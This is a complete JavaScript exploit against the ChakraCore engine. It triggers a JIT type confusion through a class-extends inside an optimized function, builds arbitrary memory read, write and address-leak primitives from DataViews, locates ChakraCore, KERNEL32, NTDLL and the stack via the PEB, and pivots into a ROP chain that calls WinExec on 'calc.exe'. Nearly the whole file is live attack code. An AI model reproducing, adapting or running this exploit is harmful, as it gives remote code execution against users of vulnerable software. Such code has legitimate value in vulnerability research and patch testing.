function int64(low,high) 
{
    this.low = low;
    this.high = high;
}
function hex(x,y=0) {
    if (y==0) {
        return "0x" + x.toString(16);
    }else{
        return x.toString(16);
    }
}
function ValidAddr(ad_h){
    // console.log(hex(ad_h));
    if(ad_h <= 0x7fff && ad_h >= 0x7ff0){
        return true;
    }else{
        return false;
    }
}
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

BASE = 0x100000000;
var op=[1,2,3,4];
op1={};
op1.a=op;

function opt(o, c, value) {
    o.b = 1;

    class A extends c {}

    o.a = value;
}

function main() {
    for (let i = 0; i < 20000; i++) {
        let o = {a: 1, b: 2};
        opt(o, (function () {}), {});
    }

    let o = {a: 1, b: 2};
    let cons = function () {};

    cons.prototype = o;

    opt(o, cons, obj); // o->auxSlots = obj (Step 1)
    o.c = dv1; // obj->auxSlots = dv1 (Step 2)
//  obj.h = dv2; // dv1->buffer = dv2 (Step 3)

    let addrof=function(t){
        op1.a=t;
        obj.h=op1;
        vtable_lo = dv1.getUint32(32, true);
        vtable_hi = dv1.getUint32(36, true);
        return new int64(vtable_lo, vtable_hi);
    }

    let read64 = function(addr) {
        obj.h = dv2;
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr.low, true);
        dv1.setUint32(0x3C, addr.high, true);
        // read from addr (Step 5)
        return new int64(dv2.getUint32(0, true), dv2.getUint32(4, true));
    }

    let write64 = function(addr, value) {
        obj.h = dv2;
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr.low, true);
        dv1.setUint32(0x3C, addr.high, true);
        // write to addr (Step 5)
        dv2.setInt32(0, value.low, true);
        dv2.setInt32(4, value.high, true);
    }

    let write128 = function(addr, value1,value2){
        obj.h = dv2;
        dv1.setUint32(0x38, addr.low, true);
        dv1.setUint32(0x3C, addr.high, true);
        dv2.setInt32(0, value1.low, true);
        dv2.setInt32(4, value1.high, true);
        dv2.setInt32(8, value2.low, true);
        dv2.setInt32(12, value2.high, true); 
    }
    obj_addr = addrof(op);
    console.log("OBJ\t",hex(obj_addr.low+(BASE*obj_addr.high),1))
    let chakra_base = read64(obj_addr);
    chakra_base.low -= ((chakra_base.low)&0xfff);
    for (;;) {
        chakra_base.low -= 0x1000;
        // console.log(hex(chakra_base.high),hex(chakra_base.low));
        if (read64(chakra_base).low == 0x905a4d) {
            break;
        }
    }
    console.log("ChakraCore.BASE\t",hex(chakra_base.low+(BASE*chakra_base.high),1));
    let IAT = new int64(chakra_base.low,chakra_base.high);
    for (;;) {
        IAT.low += 0x1000;
        let tmp0 = new int64(IAT.low,IAT.high);
        let tmp1 = new int64(IAT.low+0x8,IAT.high);
        let tmp2 = new int64(IAT.low+0x10,IAT.high);
        let tmp3 = new int64(IAT.low+0x18,IAT.high);
        if(ValidAddr(read64(tmp0).high) && ValidAddr(read64(tmp1).high) && ValidAddr(read64(tmp2).high) && ValidAddr(read64(tmp3).high)){
            break;
        }
    }
    console.log("ChakraCore.IAT\t",hex(IAT.low+(BASE*IAT.high),1));
    sundry_ptr = new int64(IAT.low+0x50,IAT.high);
    let KERNEL32 = read64(sundry_ptr);
    KERNEL32.low -= ((KERNEL32.low)&0xfff);
    for (;;) {
        KERNEL32.low -= 0x1000;
        if (read64(KERNEL32).low == 0x905a4d) {
            break;
        }
    }
    console.log("KERNEL32.BASE\t",hex(KERNEL32.low+(BASE*KERNEL32.high),1));
    let KIAT_lstrlenA = new int64(KERNEL32.low+0x76130,KERNEL32.high);
    let j_WinExec = new int64(KERNEL32.low+0x5e670,KERNEL32.high);
    let pop_rsp = new int64(KERNEL32.low+0x10baa,KERNEL32.high);
    let pop_rcx = new int64(KERNEL32.low+0x1adf3,KERNEL32.high);
    let mov_edx = new int64(KERNEL32.low+0x3454a,KERNEL32.high);
    let retn = new int64(KERNEL32.low+0x34551,KERNEL32.high);

    sundry_ptr = new int64(IAT.low+0x40,IAT.high);
    let NTDLL = read64(sundry_ptr);
    NTDLL.low -= ((NTDLL.low)&0xfff);
    for(;;){
        NTDLL.low -= 0x1000;
        if(read64(NTDLL).low == 0x905a4d){
            break;
        }
    }
    console.log("NTDLL.BASE\t",hex(NTDLL.low+(BASE*NTDLL.high),1));
    console.log("\nUSE KERNEL32 AND NTDLL TO LEAK AND ROP\n");
    dv1.setUint32(0x38,obj_addr.low+0x108,true);
    dv1.setUint32(0x3c,obj_addr.high,true);
    let shell = [0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00];
    for(let i = 0; i < shell.length; i++){
        dv2.setUint8(i,shell[i]);
    }
    let ptr2pebLdr = new int64(NTDLL.low+0x15c360-0x28,NTDLL.high);
    let PEB_ADDR = read64(ptr2pebLdr);
    console.log("PEB\t\t",hex(PEB_ADDR.low+(BASE*PEB_ADDR.high),1));
    let ptr2stackbase = new int64(PEB_ADDR.low+0x50,PEB_ADDR.high);
    let stack_base_mid = read64(ptr2stackbase);
    console.log("PEB TO STACK\t",hex(stack_base_mid.low+(BASE*stack_base_mid.high),1));
    let ptr2rbp = new int64(stack_base_mid.low-0x4c0,stack_base_mid.high);
    let STACK_PTR = read64(ptr2rbp);
    let RSP_RET = new int64(STACK_PTR.low-0x1000+0x58,STACK_PTR.high);
    console.log("POP RSP\t\t",hex(pop_rsp.low+(BASE*pop_rsp.high),1));
    console.log("RSP\t\t",hex(RSP_RET.low+(BASE*RSP_RET.high),1));
    if(RSP_RET.high >= 0x7f0 || RSP_RET.low+(BASE*RSP_RET.high) < 0){
        console.log("ERROR IN FINDING FUTURE RSP");
        return false;
    }
    let dv3 = new DataView(new ArrayBuffer(0x1000));
    let dv_addr = addrof(dv3);
    console.log("PREPARE PIVOT\t",hex(dv_addr.low+(BASE*dv_addr.high),1))

    obj_addr.low += 0x108;

    write64(dv_addr,pop_rcx);
    dv_addr.low+=8;
    write64(dv_addr,obj_addr);
    dv_addr.low+=8;
    write64(dv_addr,mov_edx);
    dv_addr.low+=8;
    write64(dv_addr,retn);
    dv_addr.low+=8;
    write64(dv_addr,j_WinExec);
    dv_addr.low-=0x20;
    write128(RSP_RET,pop_rsp,dv_addr);

}

main();